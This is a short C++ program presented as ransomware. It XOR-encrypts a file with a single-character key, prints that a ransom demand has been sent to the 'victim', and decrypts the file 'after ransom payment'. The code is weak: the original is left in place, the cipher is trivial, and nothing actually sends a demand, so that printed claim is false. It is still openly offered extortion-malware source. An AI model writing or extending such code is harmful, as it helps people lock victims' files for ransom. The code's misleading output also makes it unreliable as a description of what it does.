```
#include <iostream>
#include <fstream>
#include <string>

void encryptFile(std::string fileName) {
    std::ifstream inputFile(fileName, std::ios::binary);
    std::ofstream encryptedFile("encrypted_" + fileName, std::ios::binary);
    
    char key = '5'; // Encryption key
    
    char ch;
    while (inputFile.get(ch)) {
        ch ^= key; // XOR encryption
        encryptedFile.put(ch);
    }
    
    inputFile.close();
    encryptedFile.close();
    
    std::cout << "File encrypted successfully! Ransom demand sent to victim's computer.\n";
}

void decryptFile(std::string fileName) {
    std::ifstream encryptedFile("encrypted_" + fileName, std::ios::binary);
    std::ofstream decryptedFile("decrypted_" + fileName, std::ios::binary);
    
    char key = '5'; // Encryption key
    
    char ch;
    while (encryptedFile.get(ch)) {
        ch ^= key; // XOR encryption
        decryptedFile.put(ch);
    }
    
    encryptedFile.close();
    decryptedFile.close();
    
    std::cout << "File decrypted successfully after ransom payment!\n";
}

int main() {
    std::string fileName = "important_file.txt"; // Name of the file to encrypt
    
    encryptFile(fileName);
    decryptFile(fileName);
    
    return 0;
}
```
